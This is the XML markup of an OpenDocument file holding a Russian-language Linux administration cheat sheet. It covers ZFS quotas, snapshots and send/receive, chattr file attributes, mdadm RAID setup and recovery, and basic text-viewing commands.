      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">set</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">reservation</text:span><text:span text:style-name="T3">=1</text:span><text:span text:style-name="T2">G</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3"> - зарезервировать 1 Гигабайт, который ФС гарантированно получит, а другие не займут</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">quota</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> - выяснить квоту в пуле на ФС </text:span><text:span text:style-name="T2">backups</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">set</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">quota</text:span><text:span text:style-name="T3">=1</text:span><text:span text:style-name="T2">G</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> - установить квоту в 1 Гигабайт на ФС </text:span><text:span text:style-name="T2">backups</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">compression</text:span><text:span text:style-name="T3"> - проверить включена компрессия или нет</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs set compression=on zfspool/backups - включить компрессию на ФС backups в пуле zfspool</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs set sharesmb=on zfspool/backups - расшарить по SMB ФС backups средствами ZFS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs set sharenfs=on zfspool/backups - расшарить по NFS ФС backups средствами ZFS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Маунт</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> - отобразить все маунтированные ФС</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">zfs mount zfspool/backups - маунт ФС backups</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs umount zfspool/backups - анмаунт ФС backups</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs mount -a - маунт всех ФС ZFS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs umount -a Umount - анмаунт всех ФС ZFS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Снапшоты</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs list -t snapshot - отобразить все снапшоты</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">space</text:span><text:span text:style-name="T3"> - сколько занимают места снапшоты и конкретные дети пулов</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">snapshot</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> - создать снапшот ФС </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> с названием </text:span><text:span text:style-name="T2">test</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">rollback</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> - вернуться к снапшоту </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> с названием </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">, с ключом -</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> рекурсивно уничтожит промежуточные снапшоты, с ключом -</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> форсит анмаунт и ремаунт</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">destroy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3"> - уничтожить снапшот </text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> с названием </text:span><text:span text:style-name="T2">test</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">send</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021 &gt; /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021.</text:span><text:span text:style-name="T2">bak</text:span><text:span text:style-name="T3"> - сделать локальный бекап снапшота </text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">receive</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">2/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">2 &lt; /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021.</text:span><text:span text:style-name="T2">bak</text:span><text:span text:style-name="T3"> - Восстановить из локального снапшота ФС на другом пуле</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">send</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021 | </text:span><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">receive</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">2/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">2 - Комбо предыдущих двух</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">send</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021 | </text:span><text:span text:style-name="T2">ssh</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">COMP</text:span><text:span text:style-name="T3">02 “</text:span><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">receive</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">testpool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">testfs</text:span><text:span text:style-name="T3">” - Отправить снапшот по </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> на хост </text:span><text:span text:style-name="T2">COMP</text:span><text:span text:style-name="T3">02</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">clone</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021 /</text:span><text:span text:style-name="T2">clones</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3"> - Клонировать существующий снапшот</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">zfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">destroy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">zfspool</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">backups</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T2">march</text:span><text:span text:style-name="T3">2021 - Уничтожить клон</text:span></text:p>
      <text:p text:style-name="P1">Атрибуты файлов</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Разрешает только добавление данных в файл</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Игнорировать данный файл при создании резервной копии с помощью программы </text:span><text:span text:style-name="T2">dump</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> - Разрешить ядру автоматически сжимать/разжимать содержимое файла</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Защита файла от каких-либо изменений или манипуляций: редактирование, перемещение, удаление, создание ссылок на него</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Определяет, будет-ли при сохранении изменений, произведена синхронизация, как при использовании команды </text:span><text:span text:style-name="T2">sync</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">u</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - При удалении файла с данным атрибутом, его будет сохранено, что-бы оставить пользователю возможность восстановить данные в случае необходимости</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">chattr</text:span><text:span text:style-name="T3"> +</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Позволяет безвозвратное удаление данного файла. При удалении файла с этим атрибутом, место на диске, занимаемое файлом, перезаписывается нулями, после чего файл уже не подлежит восстановлению</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">lsattr</text:span><text:span text:style-name="T3"> - Листинг файлов с атрибутами</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Шпаргалка по </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> - утилита для работы с программными </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">-массивами различных уровней. В данной инструкции рассмотрим примеры ее использования.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Информация о </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cat</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">proc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mdstat</text:span><text:span text:style-name="T3"> - состояние всех </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 - подробная инфа о конкретном </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">lsblk</text:span><text:span text:style-name="T3"> - список дисков с разделами, местом, типом</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">df</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">hT</text:span><text:span text:style-name="T3"> - свободное место, тип файловой системы, точки монтирования</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сборка </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">zero</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">superblock</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">force</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sd</text:span><text:span text:style-name="T3">{</text:span><text:span text:style-name="T2">b</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3">} - обнуление суперблоков на дисках </text:span><text:span text:style-name="T2">sdb</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">sdc</text:span><text:span text:style-name="T3"> (для удаления инфы о других </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">) при получении ответа </text:span><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">Unrecognised</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">component</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">device</text:span><text:span text:style-name="T3"> - /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sdb</text:span><text:span text:style-name="T3"> значит, что диск не использовался для </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, продолжаем</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --create --verbose /dev/md0 -l 1 -n 2 /dev/sd{b,c}</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T3">* где /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 - устройство </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, которое появится после сборки; -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> 1 - уровень </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">; -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 2 - количество дисков, из которых собирается массив; /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sd</text:span><text:span text:style-name="T3">{</text:span><text:span text:style-name="T2">b</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3">} - сборка выполняется из дисков </text:span><text:span text:style-name="T2">sdb</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">sdc</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1">Создание файловой системы и монтирование массива</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mkfs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ext</text:span><text:span text:style-name="T3">4 /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 - создание файловой системы </text:span><text:span text:style-name="T2">ext</text:span><text:span text:style-name="T3">4 на </text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3"> - разово примонтировать </text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 к /</text:span><text:span text:style-name="T2">mnt</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nano</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">fstab</text:span><text:span text:style-name="T3">, прописать /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ext</text:span><text:span text:style-name="T3">4 </text:span><text:span text:style-name="T2">defaults</text:span><text:span text:style-name="T3"> 1 2 - постоянное монтирование, работает после перезагрузки</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Восстановление </text:span><text:span text:style-name="T2">RAID</text:span></text:p>
      <text:p text:style-name="P1">Замена жесткого диска</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">При выходе из строя, команда </text:span><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 выдаст: </text:span><text:span text:style-name="T2">State</text:span><text:span text:style-name="T3"> : </text:span><text:span text:style-name="T2">clean</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">degraded</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 --</text:span><text:span text:style-name="T2">remove</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sdc</text:span><text:span text:style-name="T3"> - удалить сбойный диск</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 --</text:span><text:span text:style-name="T2">add</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sde</text:span><text:span text:style-name="T3"> - добавить новый диск в массив</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Статус должен стать </text:span><text:span text:style-name="T2">Rebuild</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Status</text:span><text:span text:style-name="T3"> : 40% </text:span><text:span text:style-name="T2">complete</text:span><text:span text:style-name="T3"> и так до полного восстановления</text:span></text:p>
      <text:p text:style-name="P1">Пересборка массива</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если нам нужно вернуть ранее разобранный или развалившийся массив из дисков, которые уже входили в состав </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, вводим:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">assemble</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">scan</text:span><text:span text:style-name="T3"> - команда сама найдет необходимую конфигурацию и восстановит </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">assemble</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sdb</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sdc</text:span><text:span text:style-name="T3"> - с указанием из каких дисков пересобрать</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Запасной диск (</text:span><text:span text:style-name="T2">Hot</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Spare</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1">Если в массиве будет запасной диск для горячей замены, при выходе из строя одного из основных дисков, его место займет запасной.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0 --</text:span><text:span text:style-name="T2">add</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sdd</text:span><text:span text:style-name="T3"> - Диском </text:span><text:span text:style-name="T2">Hot</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Spare</text:span><text:span text:style-name="T3"> станет тот, который просто будет добавлен к массиву</text:span></text:p>
      <text:p text:style-name="P1">Добавить диск к массиву, расширить массив</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Добавление активного диска к </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, который будет использоваться для работы, а не в качестве запасного.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 --add /dev/sde</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm -G /dev/md0 --raid-devices=3 - расширяем RAID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">* в данном примере подразумевается, что у нас </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3"> 1 и мы добавили к нему 3-й диск.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установка </text:span><text:span text:style-name="T2">mdadm</text:span></text:p>
      <text:p text:style-name="P1">Если каким-то образом в дистрибутиве нет этого пакета</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install mdadm</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Удаление массива</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если нам нужно полностью разобрать </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">, сначала размонтируем и остановим его:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">umount</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">mnt</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">* где /</text:span><text:span text:style-name="T2">mnt</text:span><text:span text:style-name="T3"> - каталог монтирования нашего </text:span><text:span text:style-name="T2">RAID</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">0</text:span></text:p>
      <text:p text:style-name="P13">Затем очищаем суперблоки на всех дисках, из которых он был собран:</text:p>
      <text:p text:style-name="P15">mdadm --zero-superblock /dev/sdb</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --zero-superblock /dev/sdc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --zero-superblock /dev/sdd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Linux-</text:span><text:span text:style-name="T3">команды</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">работы</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">текстом</text:span></text:p>
      <text:p text:style-name="P1">Используя командную строку, на компьютере можно выполнять различные задачи, не пользуясь мышью или сенсорным вводом. С помощью команд удобно не только передвигаться по каталогам, но и работать с текстом любых размеров.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">less</text:span><text:span text:style-name="T3"> - команда для просмотра длинных текстов, которые не вмещаются на одном экране. Используется, если ваш терминал не поддерживает прокрутку текста.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">head</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">tail</text:span><text:span text:style-name="T3"> - команды, которые показывают начало или конец файла соответственно. С флагом -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> покажут заданное количество строк, вместо 10 выводящихся по умолчанию. Команда вида </text:span><text:span text:style-name="T2">tail</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 3 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> выведет на экран три последние строчки файла </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3">.</text:span></text:p>
